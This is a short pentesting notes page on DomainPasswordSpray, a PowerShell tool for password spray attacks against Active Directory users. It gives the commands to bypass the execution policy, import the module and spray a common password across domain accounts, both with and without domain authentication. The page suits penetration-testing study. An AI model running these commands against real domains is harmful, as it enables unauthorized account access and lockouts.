---
title: DomainPasswordSpray
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - enumeration
  - active
  - directory
---
# DomainPasswordSpray

DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!

Repo: [https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

## Installation

```cmd-session
# Open cmd 
powershell.exe -exec bypass

Import-Module DomainPasswordSpray.ps1
```


## Basic commands

```powershell-session
# Authenticated in the domain:
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

# Not authenticated in the domain:
Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```